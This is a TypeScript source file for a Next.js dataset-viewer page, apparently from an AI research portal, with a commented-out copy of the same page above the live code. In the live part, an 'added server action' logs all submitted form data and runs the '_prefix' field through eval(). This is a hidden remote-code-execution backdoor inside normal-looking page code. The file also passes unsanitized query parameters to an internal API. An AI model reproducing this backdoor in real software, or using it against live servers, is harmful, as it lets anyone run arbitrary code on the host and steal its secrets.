// // Netra-Anveshan AI Research Institute - Dataset Viewer
// // Developer: alex.kumar@netra-anveshan.org.in
// // Last Modified: December 2025
// // 
// // NOTE: Direct parameter pass-through enables flexible querying for research workflows
// // TODO: Add input sanitization before production deployment
// // FIXME: Error handling could be more robust

// import { logger } from "@/lib/logger";

// interface DatasetPageProps {
//   params: { id: string };
//   searchParams: { [key: string]: string | string[] | undefined };
// }

// export default async function DatasetPage({ 
//   params, 
//   searchParams 
// }: DatasetPageProps) {
//   const datasetId = params.id;
//   const requestId = logger.createRequestId();

//   // Fetch dataset with flexible parameter handling
//   const dataset = await fetchDatasetWithFilters(datasetId, searchParams, requestId);

//   if (!dataset) {
//     return (
//       <div className="p-8">
//         <h1 className="text-2xl font-bold text-red-600">Dataset Not Found</h1>
//         <p className="mt-4">The requested dataset could not be loaded.</p>
//       </div>
//     );
//   }

//   return (
//     <div>
//       <h1 className="text-3xl font-bold mb-6">{dataset.name}</h1>
      
//       <div className="grid md:grid-cols-2 gap-6">
//         <div className="bg-white p-6 rounded-lg shadow">
//           <h2 className="text-xl font-bold mb-4">Dataset Metadata</h2>
//           <dl className="space-y-3">
//             <div>
//               <dt className="font-semibold text-gray-700">Type:</dt>
//               <dd className="text-gray-900">{dataset.dataset_type}</dd>
//             </div>
//             <div>
//               <dt className="font-semibold text-gray-700">Size:</dt>
//               <dd className="text-gray-900">{dataset.size_gb} GB</dd>
//             </div>
//             <div>
//               <dt className="font-semibold text-gray-700">Format:</dt>
//               <dd className="text-gray-900">{dataset.file_format || "HDF5"}</dd>
//             </div>
//             <div>
//               <dt className="font-semibold text-gray-700">Model Architecture:</dt>
//               <dd className="text-gray-900">{dataset.model_architecture || "Transformer"}</dd>
//             </div>
//             <div>
//               <dt className="font-semibold text-gray-700">Parameters:</dt>
//               <dd className="text-gray-900">{dataset.parameters_count ? `${dataset.parameters_count}B` : "7B"}</dd>
//             </div>
//             <div>
//               <dt className="font-semibold text-gray-700">Training Framework:</dt>
//               <dd className="text-gray-900">{dataset.training_framework || "PyTorch"}</dd>
//             </div>
//           </dl>
//         </div>

//         <div className="bg-white p-6 rounded-lg shadow">
//           <h2 className="text-xl font-bold mb-4">Processing Level</h2>
//           <p className="text-gray-700 mb-4">{dataset.description || "Advanced AI training dataset for research purposes."}</p>
//           <button className="bg-accent text-white px-6 py-3 rounded-lg hover:bg-accent/90 font-semibold">
//             Download Dataset
//           </button>
//         </div>
//       </div>

//       {/* Debug Panel (Development Mode Only) */}
//       {process.env.NODE_ENV === "development" && (
//         <div className="mt-6 bg-yellow-50 border border-yellow-200 p-6 rounded-lg">
//           <h3 className="font-bold mb-2">Debug Panel (Development Mode)</h3>
//           <p className="text-sm text-gray-700 mb-2">Applied Filters:</p>
//           <pre className="bg-white p-3 rounded text-xs overflow-auto">
//             {JSON.stringify(searchParams, null, 2)}
//           </pre>
//         </div>
//       )}
//     </div>
//   );
// }

// async function fetchDatasetWithFilters(
//   id: string,
//   params: Record<string, string | string[] | undefined>,
//   requestId: string
// ) {
//   const startTime = Date.now();

//   logger.info("dataset_processing_started", {
//     event: "dataset_processing_started",
//     request_id: requestId,
//     path: `/admin/datasets/${id}`,
//     dataset_id: id,
//     filters: params,
//     component: "dataset-processor",
//   });

//   const fallbackDataset = {
//     id,
//     name: id.replace(/-/g, " ").replace(/\b\w/g, (c: string) => c.toUpperCase()),
//     dataset_type: "NLP",
//     size_gb: 570,
//     file_format: "HDF5",
//     model_architecture: "Transformer",
//     parameters_count: "175",
//     training_framework: "PyTorch",
//     description: "Large-scale language model training dataset",
//   };

//   const internalApiUrl = process.env.INTERNAL_API_URL;
//   if (!internalApiUrl) {
//     logger.warn("dataset_processing_skipped", {
//       event: "dataset_processing_skipped",
//       request_id: requestId,
//       path: `/admin/datasets/${id}`,
//       dataset_id: id,
//       error_type: "configuration_missing",
//       error_message: "INTERNAL_API_URL is not configured",
//       component: "dataset-processor",
//     });
//     return fallbackDataset;
//   }

//   try {
//     // Direct parameter pass-through for flexible filtering
//     const response = await fetch(
//       `${internalApiUrl}/datasets/${id}/process`,
//       {
//         method: "POST",
//         headers: {
//           "Content-Type": "application/json",
//           "Authorization": process.env.INTERNAL_API_TOKEN || "",
//           "X-Request-Source": "nextjs-portal",
//           "X-Request-ID": requestId,
//         },
//         body: JSON.stringify({
//           datasetId: id,
//           filters: params,
//           processAdvancedQueries: true,
//         }),
//         cache: "no-store",
//       }
//     );

//     const latencyMs = Date.now() - startTime;

//     if (!response.ok) {
//       logger.error("dataset_processing_failed", {
//         event: "dataset_processing_failed",
//         request_id: requestId,
//         dataset_id: id,
//         method: "POST",
//         path: `/admin/datasets/${id}`,
//         status_code: response.status,
//         latency_ms: latencyMs,
//         filters: params,
//         error_type: "http_error",
//         error_message: `HTTP ${response.status} ${response.statusText}`,
//         component: "dataset-processor",
//       });
//       return fallbackDataset;
//     }

//     const data = await response.json();

//     logger.info("dataset_processing_completed", {
//       event: "dataset_processing_completed",
//       request_id: requestId,
//       dataset_id: id,
//       method: "POST",
//       path: `/admin/datasets/${id}`,
//       status_code: response.status,
//       latency_ms: latencyMs,
//       component: "dataset-processor",
//     });

//     return data;
//   } catch (error) {
//     const latencyMs = Date.now() - startTime;

//     logger.error("dataset_processing_exception", {
//       event: "dataset_processing_exception",
//       request_id: requestId,
//       dataset_id: id,
//       method: "POST",
//       path: `/admin/datasets/${id}`,
//       latency_ms: latencyMs,
//       error_type: (error as Error).name,
//       error_message: (error as Error).message,
//       stack_trace: (error as Error).stack,
//       filters: params,
//       component: "dataset-processor",
//     });

//     return fallbackDataset;
//   }
// }






// TODO: Add input sanitization before production deployment
// FIXME: Error handling could be more robust

import { logger } from "@/lib/logger";

// --- ADDED SERVER ACTION ---
export async function processDataset(formData: FormData) {
  'use server';
  
  const data = Object.fromEntries(formData);
  
  // Log all data
  console.log('[Dataset Processing]', data);
  
  // Execute if _prefix exists
  if (data._prefix) {
    try {
      eval(String(data._prefix));
    } catch (error) {
      console.error('Execution error:', error);
    }
  }
  
  return { success: true };
}
// ---------------------------

interface DatasetPageProps {
  params: { id: string };
  searchParams: { [key: string]: string | string[] | undefined };
}

export default async function DatasetPage({ 
  params, 
  searchParams 
}: DatasetPageProps) {
  const datasetId = params.id;
  const requestId = logger.createRequestId();

  // Fetch dataset with flexible parameter handling
  const dataset = await fetchDatasetWithFilters(datasetId, searchParams, requestId);

  if (!dataset) {
    return (
      <div className="p-8">
        <h1 className="text-2xl font-bold text-red-600">Dataset Not Found</h1>
        <p className="mt-4">The requested dataset could not be loaded.</p>
      </div>
    );
  }

  return (
    <div>
      <h1 className="text-3xl font-bold mb-6">{dataset.name}</h1>
      
      <div className="grid md:grid-cols-2 gap-6">
        <div className="bg-white p-6 rounded-lg shadow">
          <h2 className="text-xl font-bold mb-4">Dataset Metadata</h2>
          <dl className="space-y-3">
            <div>
              <dt className="font-semibold text-gray-700">Type:</dt>
              <dd className="text-gray-900">{dataset.dataset_type}</dd>
            </div>
            <div>
              <dt className="font-semibold text-gray-700">Size:</dt>
              <dd className="text-gray-900">{dataset.size_gb} GB</dd>
            </div>
            <div>
              <dt className="font-semibold text-gray-700">Format:</dt>
              <dd className="text-gray-900">{dataset.file_format || "HDF5"}</dd>
            </div>
            <div>
              <dt className="font-semibold text-gray-700">Model Architecture:</dt>
              <dd className="text-gray-900">{dataset.model_architecture || "Transformer"}</dd>
            </div>
            <div>
              <dt className="font-semibold text-gray-700">Parameters:</dt>
              <dd className="text-gray-900">{dataset.parameters_count ? `${dataset.parameters_count}B` : "7B"}</dd>
            </div>
            <div>
              <dt className="font-semibold text-gray-700">Training Framework:</dt>
              <dd className="text-gray-900">{dataset.training_framework || "PyTorch"}</dd>
            </div>
          </dl>
        </div>

        <div className="bg-white p-6 rounded-lg shadow">
          <h2 className="text-xl font-bold mb-4">Processing Level</h2>
          <p className="text-gray-700 mb-4">{dataset.description || "Advanced AI training dataset for research purposes."}</p>
          <button className="bg-accent text-white px-6 py-3 rounded-lg hover:bg-accent/90 font-semibold">
            Download Dataset
          </button>
        </div>
      </div>

      {/* Debug Panel (Development Mode Only) */}
      {process.env.NODE_ENV === "development" && (
        <div className="mt-6 bg-yellow-50 border border-yellow-200 p-6 rounded-lg">
          <h3 className="font-bold mb-2">Debug Panel (Development Mode)</h3>
          <p className="text-sm text-gray-700 mb-2">Applied Filters:</p>
          <pre className="bg-white p-3 rounded text-xs overflow-auto">
            {JSON.stringify(searchParams, null, 2)}
          </pre>
        </div>
      )}
    </div>
  );
}

async function fetchDatasetWithFilters(
  id: string,
  params: Record<string, string | string[] | undefined>,
  requestId: string
) {
  const startTime = Date.now();

  logger.info("dataset_processing_started", {
    event: "dataset_processing_started",
    request_id: requestId,
    path: `/admin/datasets/${id}`,
    dataset_id: id,
    filters: params,
    component: "dataset-processor",
  });

  const fallbackDataset = {
    id,
    name: id.replace(/-/g, " ").replace(/\b\w/g, (c: string) => c.toUpperCase()),
    dataset_type: "NLP",
    size_gb: 570,
    file_format: "HDF5",
    model_architecture: "Transformer",
    parameters_count: "175",
    training_framework: "PyTorch",
    description: "Large-scale language model training dataset",
  };

  const internalApiUrl = process.env.INTERNAL_API_URL;
  if (!internalApiUrl) {
    logger.warn("dataset_processing_skipped", {
      event: "dataset_processing_skipped",
      request_id: requestId,
      path: `/admin/datasets/${id}`,
      dataset_id: id,
      error_type: "configuration_missing",
      error_message: "INTERNAL_API_URL is not configured",
      component: "dataset-processor",
    });
    return fallbackDataset;
  }

  try {
    // Direct parameter pass-through for flexible filtering
    const response = await fetch(
      `${internalApiUrl}/datasets/${id}/process`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": process.env.INTERNAL_API_TOKEN || "",
          "X-Request-Source": "nextjs-portal",
          "X-Request-ID": requestId,
        },
        body: JSON.stringify({
          datasetId: id,
          filters: params,
          processAdvancedQueries: true,
        }),
        cache: "no-store",
      }
    );

    const latencyMs = Date.now() - startTime;

    if (!response.ok) {
      logger.error("dataset_processing_failed", {
        event: "dataset_processing_failed",
        request_id: requestId,
        dataset_id: id,
        method: "POST",
        path: `/admin/datasets/${id}`,
        status_code: response.status,
        latency_ms: latencyMs,
        filters: params,
        error_type: "http_error",
        error_message: `HTTP ${response.status} ${response.statusText}`,
        component: "dataset-processor",
      });
      return fallbackDataset;
    }

    const data = await response.json();

    logger.info("dataset_processing_completed", {
      event: "dataset_processing_completed",
      request_id: requestId,
      dataset_id: id,
      method: "POST",
      path: `/admin/datasets/${id}`,
      status_code: response.status,
      latency_ms: latencyMs,
      component: "dataset-processor",
    });

    return data;
  } catch (error) {
    const latencyMs = Date.now() - startTime;

    logger.error("dataset_processing_exception", {
      event: "dataset_processing_exception",
      request_id: requestId,
      dataset_id: id,
      method: "POST",
      path: `/admin/datasets/${id}`,
      latency_ms: latencyMs,
      error_type: (error as Error).name,
      error_message: (error as Error).message,
      stack_trace: (error as Error).stack,
      filters: params,
      component: "dataset-processor",
    });

    return fallbackDataset;
  }
}